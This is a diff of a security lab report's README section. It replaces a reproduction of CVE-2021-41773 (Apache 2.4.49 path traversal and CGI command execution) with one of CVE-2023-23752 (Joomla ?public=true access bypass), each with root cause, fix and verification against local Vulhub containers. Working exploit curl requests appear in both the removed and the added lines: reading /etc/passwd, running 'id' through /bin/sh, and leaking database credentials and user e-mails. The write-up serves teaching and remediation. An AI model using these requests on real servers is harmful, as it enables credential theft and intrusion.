@@ -269,158 +269,155 @@ Output of `./scripts/demo.sh` against the running server.
 
 A second, deliberately vulnerable target was reproduced and remediated with
 [Vulhub](https://github.com/vulhub/vulhub). All files are under
-[`cve-2021-41773/`](cve-2021-41773/): the runnable `vulnerable/` and `fix/`
-environments and the raw terminal logs in `evidence/`.
+[`cve-2023-23752/`](cve-2023-23752/): the runnable `vulnerable/` and `fix/`
+environments and the raw command logs in `evidence/`.
 
 ### 6.1 Selected vulnerability
 
-**CVE-2021-41773 — path traversal and file disclosure in Apache HTTP Server 2.4.49.**
+**CVE-2023-23752 — improper access check in Joomla! web-service endpoints.**
 
 | Field | Value |
 |---|---|
-| Component | Apache HTTP Server (`httpd`) |
-| Affected version | **2.4.49** (regression introduced in this release) |
-| Weakness | CWE-22 — Path Traversal |
-| Impact | Arbitrary file read; **remote code execution** when `mod_cgi` is enabled |
-| CVSS 3.1 | 7.5 (High), effectively Critical once it escalates to RCE |
-| Fixed in | 2.4.51 (2.4.50 was an incomplete fix, bypassed by CVE-2021-42013) |
+| Component | Joomla! CMS (web services / REST API) |
+| Affected version | **4.0.0 – 4.2.7** |
+| Weakness | CWE-862 — Missing Authorization (improper access control) |
+| Impact | Unauthenticated disclosure of the application config, incl. the **database username and password**, and of all users' names and e-mails |
+| CVSS 3.1 | 5.3 (Medium); higher in practice once the leaked DB password is reused |
+| Fixed in | Joomla 4.2.8 |
 
-A change to URL path normalization in 2.4.49 let an attacker smuggle a
-URL-encoded dot-segment (`%2e`) past the server's `../` filter. A request can
-then be mapped to files **outside** the document root. If those files are not
-protected by the default `Require all denied`, they are disclosed; if CGI is
-enabled, the traversal reaches `/bin/sh` and runs arbitrary commands.
+Joomla 4 exposes a REST API under `/api/`. Endpoints such as
+`v1/config/application` and `v1/users` are meant to require authentication.
+Because of an improper access check, appending **`?public=true`** overrides the
+server's own access flag and returns the data with no authentication at all.
 
-The Vulhub image (`vulnerable/Dockerfile`) deliberately combines the three
-conditions needed for a full compromise, confirmed live in the container
-(`evidence/rootcause-config.txt`):
-
-1. `FROM vulhub/httpd:2.4.49` — the vulnerable binary (the actual bug);
-2. `LoadModule cgid_module` + `ScriptAlias /cgi-bin/` — enables CGI → RCE;
-3. `<Directory />` changed from the secure default `Require all denied` to
-   **`Require all granted`** — removes the wall that protects everything outside
-   the web root.
+The Vulhub environment (`vulnerable/`) runs Joomla 4.2.7 with a MySQL backend
+(`docker compose up -d`, port 8085; the only change from the stock Vulhub file is
+the host port 8080 → 8085, because 8080 was already in use on the test machine).
 
 ### 6.2 Reproducing the vulnerability
 
 ```bash
-cd cve-2021-41773/vulnerable
-docker compose up -d --build
-curl http://localhost:8081/          # -> <h1>It works!</h1>
+cd cve-2023-23752/vulnerable
+docker compose up -d        # Joomla 4.2.7 + MySQL, on http://localhost:8085
 ```
 
-**Baseline** — a plain, un-encoded traversal is correctly normalized and rejected,
-so the attacker has to defeat the `%2e` trick (`evidence/attack-01-baseline.txt`):
+**Baseline** — the endpoint is protected without the bypass
+(`evidence/attack-01-baseline.txt`):
 
 ```bash
-$ curl -s -o /dev/null -w 'HTTP %{http_code}\n' --path-as-is \
-    "http://localhost:8081/icons/../../../../etc/passwd"
-HTTP 400
+$ curl -s -i 'http://localhost:8085/api/index.php/v1/config/application'
+HTTP/1.1 401 Unauthorized
+{"errors":[{"title":"Forbidden"}]}
 ```
 
-**Exploit A — arbitrary file read.** The second dot of each `..` is written as
-`%2e`; `--path-as-is` keeps curl from normalizing the path itself
-(`evidence/attack-02-file-read.txt`):
+**Exploit A — database credential disclosure.** Appending `?public=true` bypasses
+the access check (`evidence/attack-02-config-leak.txt`):
 
 ```bash
-$ curl -s --path-as-is \
-    "http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+$ curl -s 'http://localhost:8085/api/index.php/v1/config/application?public=true'
+HTTP/1.1 200 OK
+... "host":"mysql" ... "user":"root" ... "password":"vulhub" ... "db":"joomla" ...
 ```
 
-**Exploit B — remote code execution.** Because `mod_cgid` is loaded, the same
-traversal targets the `cgi-bin` alias and resolves to `/bin/sh`, which Apache
-runs as CGI with the POST body as its script (`evidence/attack-03-rce.txt`):
+**Exploit B — user / e-mail disclosure.** The same bypass leaks every account
+(`evidence/attack-03-users-leak.txt`):
 
 ```bash
-$ curl -s --data "echo;id" \
-    "http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ curl -s 'http://localhost:8085/api/index.php/v1/users?public=true'
+... "username":"admin"   "email":"admin@example.com"   (Super Users)
+... "username":"manager" "email":"manager@example.com" (Manager)
 ```
 
-Further commands (`hostname`, `uname -a`) confirm full in-container execution as
-the `daemon` user. At this point the attacker has read-anything **and** command
-execution.
-
-![Reproduction on Apache 2.4.49 — Exploit A discloses /etc/passwd, Exploit B runs `id` via mod_cgi](docs/screenshots/cve-reproduce.png)
+![Reproduction on Joomla 4.2.7 — ?public=true leaks DB credentials and user e-mails](docs/screenshots/cve-reproduce.png)
 
 ### 6.3 Root cause analysis
 
-**The bug is a code regression, not a misconfiguration.** Apache resolves a URL
-in two stages: it first **normalizes** the path (collapsing `.`/`..` so a URL
-cannot climb above the web root), then **decodes** percent-escapes and maps the
-result onto the filesystem. Security depends on normalization running on the
-*fully decoded* path, so an encoded `..` is caught just like a literal one.
+**The flaw is improper authorization in the API router (CWE-862), not a
+misconfiguration.** Joomla's API router builds each route with a default access
+flag — protected routes carry `'public' => false`. In
+`libraries/src/Router/ApiRouter.php`, the router then merges the **raw request
+query string** over those defaults:
 
-In the 2.4.49 rewrite of the path handler (`ap_normalize_path` in
-`server/util.c`) that ordering broke: the dot-segment remover only matched
-**literal** `.` characters, so a segment written as `.%2e` was not recognized as
-`..` and slipped through normalization untouched. When the path was later
-percent-decoded on the way to the filesystem, `%2e` became `.`, re-forming `../`
-— but now **after** the only check meant to stop it. So `/icons/.%2e/` behaves as
-`/icons/../`, and chaining several of them climbs to the filesystem root.
+```php
+$vars = $route->getDefaults();        // includes 'public' => false for protected routes
+...
+$vars = array_merge($vars, $query);   // <-- the user's query overrides the defaults
+```
 
-Two configuration factors decide the severity (they are *not* the vulnerability,
-but the image enables them): `Require all granted` removes the authorization
-safety net that would otherwise refuse paths outside the web root, and
-`mod_cgi` escalates *read* into *execute*. The root cause itself is the
-normalization regression — improper input handling in the URL parser.
+Because `array_merge($vars, $query)` lets request input win, an attacker-supplied
+`?public=true` overwrites the route's own `public => false`. The authentication
+gate in `ApiApplication::route()` then reads this polluted value:
 
-> *Vulnerability vs. exploit:* the vulnerability is the normalization flaw in the
-> 2.4.49 code; the exploit is the concrete `curl` request with `%2e`-encoded
-> dot-segments that weaponizes it against this CGI-enabled deployment.
+```php
+if (!isset($route['vars']['public']) || $route['vars']['public'] === false) {
+    // require authentication
+}
+```
+
+Since `public` is now `"true"` (no longer `=== false`), the authentication check
+is skipped and the protected endpoint returns its data. Root cause: a trusted
+security decision (the `public` flag) is taken from a value the user can control.
+Maps to **OWASP A01:2021 Broken Access Control**.
+
+> *Vulnerability vs. exploit:* the vulnerability is the improper access check in
+> `ApiRouter`; the exploit is the single `?public=true` request that weaponizes it.
 
 ### 6.4 Applied fix
 
-The fix (`cve-2021-41773/fix/`) combines a root-cause change with defense in depth:
+The definitive production fix is to **upgrade to Joomla ≥ 4.2.8**. To demonstrate
+and verify the fix on the same running environment, `cve-2023-23752/fix/` applies
+the equivalent code patch (`fix/ApiRouter.php`, copied into the image by
+`fix/Dockerfile`): it captures the route's own `public` flag and restores it
+**after** the query merge, so user input can no longer override it.
 
-| | Vulnerable | Fixed |
-|---|---|---|
-| Base image | `FROM vulhub/httpd:2.4.49` | `FROM httpd:2.4.54` |
-| `<Directory />` | `Require all granted` | stock default `Require all denied` |
-| CGI | enabled | still enabled (feature kept) |
+```php
+$routePublic = isset($vars['public']) ? $vars['public'] : false;
+$vars        = array_merge($vars, $query);
+$vars['public'] = $routePublic;        // ignore any attacker-supplied "public"
+```
 
-1. **Primary fix — upgrade Apache (removes the root cause).** 2.4.54 ships the
-   patched `ap_normalize_path`, so encoded dot-segments are normalized correctly
-   and can no longer escape the web root. 2.4.54 is pinned rather than 2.4.50
-   because **2.4.50's fix was incomplete** (double-encoding bypass, CVE-2021-42013);
-   2.4.51+ closes that too.
-2. **Defense in depth — keep `Require all denied` on `<Directory />`.** The
-   `perl` step that had loosened the root policy is simply removed, restoring
-   Apache's secure default, so even a future traversal bug would still be denied
-   outside the explicitly-granted web root.
+This is effective because the authentication decision no longer depends on
+user-controlled input: a protected route stays `public => false` whatever the
+query string contains, so the auth gate always runs.
 
-The two changes block the attack at two layers: the upgrade stops the malicious
-path from resolving outside the web root, and the restored default would deny it
-even if it did.
+```bash
+# stop the vulnerable stack, then build & start the fixed one (same port 8085)
+cd cve-2023-23752/vulnerable && docker compose down
+cd ../fix && docker compose up -d --build
+```
 
 ### 6.5 Verification of the fix
 
-Re-running the **exact same** exploits against `fix/`
-(`evidence/verify-01-exploits-blocked.txt`):
+Re-running the **same** exploits against the patched environment
+(`evidence/verify-01-fixed.txt`):
 
-| Test | Vulnerable (2.4.49) | Fixed (2.4.54) |
+| Test | Vulnerable (4.2.7) | Fixed (4.2.7 + patch) |
 |---|---|---|
-| A — file read `/icons/.%2e/.../etc/passwd` | `200 OK` + `/etc/passwd` (926 B) | **`400 Bad Request`**, 0 bytes |
-| B — RCE `/cgi-bin/.%2e/.../bin/sh` | `200 OK` + `uid=1(daemon)...` | **`400 Bad Request`**, no output |
-| Regression — `GET /` | `200` "It works!" | **`200` "It works!"** (unchanged) |
+| A — `config/application?public=true` | `200 OK` + DB user/password | **`401 Unauthorized`**, `{"errors":[{"title":"Forbidden"}]}` |
+| B — `users?public=true` | `200 OK` + all e-mails | **`401 Unauthorized`**, no user data |
+| Regression — `GET /` | `200` (site works) | **`200`** (site works) |
 
 ```bash
-$ curl -s -o /dev/null -w 'HTTP %{http_code}  bytes=%{size_download}\n' --path-as-is \
-    "http://localhost:8081/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-HTTP 400  bytes=226          # error page, not /etc/passwd
+$ curl -s -o /dev/null -w 'config -> HTTP %{http_code}\n' \
+    'http://localhost:8085/api/index.php/v1/config/application?public=true'
+config -> HTTP 401          # Forbidden, no credentials
 
-$ curl -s -o /dev/null -w 'HTTP %{http_code}\n' --data "echo;id" \
-    "http://localhost:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
-HTTP 400                     # no shell, no "uid=..."
+$ curl -s -o /dev/null -w 'users  -> HTTP %{http_code}\n' \
+    'http://localhost:8085/api/index.php/v1/users?public=true'
+users  -> HTTP 401          # Forbidden, no user data
 
-$ curl -s http://localhost:8081/
-<html><body><h1>It works!</h1></body></html>   # HTTP 200, functionality intact
+$ curl -s -o /dev/null -w 'home   -> HTTP %{http_code}\n' http://localhost:8085/
+home   -> HTTP 200          # site still works
 ```
 
-The patched Apache returns **`400 Bad Request`** — it rejects the encoded
-dot-segments *during normalization*, before any filesystem lookup or
-authorization check. That is direct evidence the parser bug is gone (a config-only
-fix would instead produce `403 Forbidden`, i.e. the file still reachable but
-denied). The homepage still serves normally, so the **regression test passes**.
+The patched router returns **`401 Unauthorized`** — `?public=true` can no longer
+override the route's access flag, so authentication is enforced and nothing is
+leaked, while the site keeps working (**regression test passed**).
 
-![After the fix — both exploits return HTTP 400 and the homepage still works](docs/screenshots/cve-fixed.png)
+![After the fix — both exploits return HTTP 401 Forbidden and the site still works](docs/screenshots/cve-fixed.png)
+
+### References
+
+- NVD — CVE-2023-23752: <https://nvd.nist.gov/vuln/detail/CVE-2023-23752>
+- Joomla security advisory: <https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html>
+- Vulhub: <https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2023-23752>
